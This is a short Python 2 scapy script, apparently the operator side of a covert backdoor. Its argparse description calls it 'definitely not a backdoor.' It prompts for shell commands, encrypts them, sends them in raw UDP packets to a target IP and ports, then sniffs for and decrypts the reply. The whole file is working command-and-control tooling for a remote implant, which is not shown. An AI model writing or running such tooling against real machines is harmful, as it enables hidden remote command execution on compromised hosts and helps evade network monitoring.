import crypto
import argparse
import logging
# supress scapy warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

def packetFunc(packet):
  # scapy is garbage and get's arp packet even though we're filtering
  if ARP not in packet:
    print "Got a packet"
    encryptedData = packet['Raw'].load
    data = crypto.decrypt(encryptedData)
    print data

parser = argparse.ArgumentParser(description="This is definitely not a backdoor.")
parser.add_argument('-s'
                   , '--sport'
                   , dest='sourcePort'
                   , help='Source port of packets to send.'
                   , required=True)
parser.add_argument('-d'
                   , '--dport'
                   , dest='destPort'
                   , help='Destination port of packets to send.'
                   , required=True)
parser.add_argument('-ip'
                   , '--destIP'
                   , dest='destIP'
                   , help='Destination IP'
                   , required=True)
args = parser.parse_args()

command = "ls -l"
sniffFilter = 'udp and dst port {0} and src port {1}' .format(args.sourcePort, args.destPort)
while True:
  command = raw_input("Command? (exit to end) ")
  if command == "exit":
    sys.exit()
  else:
    encryptedCommand = crypto.encrypt(command)
    packet = IP(dst=args.destIP)/UDP(dport=int(args.destPort), sport=int(args.sourcePort))/Raw(load=encryptedCommand)
    send(packet)
    sniff(filter=sniffFilter,prn=packetFunc, count=1)

